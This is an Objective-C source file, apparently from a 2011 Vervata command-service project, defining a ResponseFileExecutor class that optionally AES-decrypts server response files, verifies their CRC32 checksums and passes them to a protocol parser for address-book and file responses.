//
//  Test.m
//  CommandServiceManager
//
//  Created by Pichaya Srifar on 10/7/11.
//  Copyright 2011 Vervata. All rights reserved.
//

#import "ResponseFileExecutor.h"
#import "CRC32.h"
#import "GetAddressBookResponse.h"
#import "ProtocolParser.h"
#import "NSFileManager-AES.h"

@implementation ResponseFileExecutor

+ (id)executeFile:(NSString *)path withKey:(NSString *)key {
	NSString *aesKey = [[key mutableCopy] autorelease];
	NSString *responseFilePath = [[path mutableCopy] autorelease];
	NSString *responseDecryptedFilePath = [[[NSString alloc] initWithFormat:@"%@.decrypted", responseFilePath] autorelease];

	int8_t encryptFlag;
	uint32_t crc32;

	NSFileHandle * fileHandle = [NSFileHandle fileHandleForReadingAtPath:responseFilePath];
	if (fileHandle == nil) {
		// Return transport error	
//		[aesKey release];
//		[responseFilePath release];
//		[responseDecryptedFilePath release];
		DLog(@"nil fileHandle");	
		return nil;
	}
	
	//DLog(@"resp1 %@", [NSData dataWithContentsOfFile:responseFilePath]);
	NSData *firstByte = [fileHandle readDataOfLength:1];
	[firstByte getBytes:&encryptFlag length:sizeof(encryptFlag)];
	//DLog(@"DEBUG 1");
	if (encryptFlag == 1) {
		NSFileManager *fileMgr = [NSFileManager defaultManager];
		if ([fileMgr fileExistsAtPath:responseFilePath]) {
			NSError *error = nil;
			//DLog(@"DEBUG 2");
			[fileMgr AESDecryptFile:responseFilePath toFile:responseDecryptedFilePath usingPassphrase:aesKey offset:1 error:&error];
			
			if (error != nil) {
				//return transport error
				DLog(@"AESDecryptFile error");
				return nil;
			}
			
			//DLog(@"x count %d count %d", [responseDecryptedFilePath retainCount], [responseFilePath retainCount]);
			// remove encrypted file
			error = nil;
			fileHandle = [NSFileHandle fileHandleForReadingAtPath:responseDecryptedFilePath];
			
			//DLog(@"x count %d count %d", [responseDecryptedFilePath retainCount], [responseFilePath retainCount]);
			[fileMgr removeItemAtPath:responseFilePath error:&error];
			//DLog(@"x count %d count %d", [responseDecryptedFilePath retainCount], [responseFilePath retainCount]);
			
			//DLog(@"DECRYPTED RESP = %@ %@", [NSData dataWithContentsOfFile:responseDecryptedFilePath], [error domain]);
			//DLog(@"x count %d count %d", [responseDecryptedFilePath retainCount], [responseFilePath retainCount]);
			
		} else {
			// return transport error
			DLog(@"no file at responseFilePath");
			return nil;
		}
	}
	//DLog(@"DEBUG 3");
	// move file ptr to position 1
	if (encryptFlag != 1) {
		[fileHandle seekToFileOffset:1];
	}	
	
	// read next 4 bytes
	NSData *next4Bytes = [fileHandle readDataOfLength:4];
	[next4Bytes getBytes:&crc32 length:sizeof(crc32)];
	crc32 = ntohl(crc32);
	
	//DLog(@"count %d count %d", [responseDecryptedFilePath retainCount], [responseFilePath retainCount]);
	int calCRC32;
	if (encryptFlag == 1) {
		calCRC32 = [CRC32 crc32File:responseDecryptedFilePath offset:4];
	} else {
		calCRC32 = [CRC32 crc32File:responseFilePath offset:5];
	}
	
	
	
	DLog(@"crc32 = %d cal = %d", crc32, calCRC32);
	
	
	if (crc32 != calCRC32) {
		// return transport error
		DLog(@"crc32 not matched");
		return nil;
	}
	GetAddressBookResponse *result = nil;
	
	//DLog(@"x count %ld count %d", responseDecryptedFilePath, [responseFilePath retainCount]);
	if (encryptFlag == 1) {
		result = [ProtocolParser parseGetAddressBookResponse:responseDecryptedFilePath offset:4];
	} else {
		result = [ProtocolParser parseGetAddressBookResponse:responseFilePath offset:5];
	}
	//DLog(@"count %d count %d", [responseDecryptedFilePath retainCount], [responseFilePath retainCount]);

//	[aesKey release];
//	[responseFilePath release];
//	[responseDecryptedFilePath release];
	return result;
	
}

+ (id) parseResponse: (NSString *) aFilePath withAESKey: (NSString *) aAESKey {
	NSString *responseDecryptedFilePath = [[[NSString alloc] initWithFormat:@"%@.decrypted", aFilePath] autorelease];
	
	int8_t encryptFlag;
	uint32_t crc32;
	
	NSFileHandle * fileHandle = [NSFileHandle fileHandleForReadingAtPath:aFilePath];
	if (fileHandle == nil) {
		// Return transport error	
//		[responseDecryptedFilePath release];
		DLog(@"nil fileHandle");
		return nil;
	}
	
	//DLog(@"Reponse data file before decrypted = %@", [NSData dataWithContentsOfFile:aFilePath]);
	NSData *firstByte = [fileHandle readDataOfLength:1];
	[firstByte getBytes:&encryptFlag length:sizeof(encryptFlag)];
	
	if (encryptFlag == 1) {
		NSFileManager *fileMgr = [NSFileManager defaultManager];
		if ([fileMgr fileExistsAtPath:aFilePath]) {
			NSError *error = nil;
			[fileMgr AESDecryptFile:aFilePath
							 toFile:responseDecryptedFilePath
					usingPassphrase:aAESKey
							 offset:1
							  error:&error];
			
			if (error != nil) {
				// Return transport error
				DLog(@"AESDecryptFile error");
				return nil;
			}
			
			// Access file handle to decrypted file
			fileHandle = [NSFileHandle fileHandleForReadingAtPath:responseDecryptedFilePath];
			
			// Remove encrypted file
			error = nil;
			[fileMgr removeItemAtPath:aFilePath error:&error];
			//DLog(@"DECRYPTED FILE RESPONSE = %@, error = %@", [NSData dataWithContentsOfFile:responseDecryptedFilePath], [error domain]);
		} else {
			// Return transport error
			DLog(@"No file at responseFilePath");
			return nil;
		}
	}
	
	// Move file ptr to position 1
	if (encryptFlag != 1) {
		[fileHandle seekToFileOffset:1];
	}	
	
	// Read next 4 bytes crc32
	NSData *next4Bytes = [fileHandle readDataOfLength:4];
	[next4Bytes getBytes:&crc32 length:sizeof(crc32)];
	crc32 = ntohl(crc32);
	
	int calCRC32 = 0;
	if (encryptFlag == 1) {
		calCRC32 = [CRC32 crc32File:responseDecryptedFilePath offset:4];
	} else {
		calCRC32 = [CRC32 crc32File:aFilePath offset:5];
	}

	DLog(@"crc32 = %d cal = %d", crc32, calCRC32);
	
	if (crc32 != calCRC32) {
		// Return transport error
		DLog(@"crc32 not matched");
		return nil;
	}
	
	id result = nil;
	if (encryptFlag == 1) {
		result = [ProtocolParser parseFileResponse:responseDecryptedFilePath offset:4];
	} else {
		result = [ProtocolParser parseFileResponse:aFilePath offset:5];
	}
	
//	[responseDecryptedFilePath release];
	return (result);
}

@end
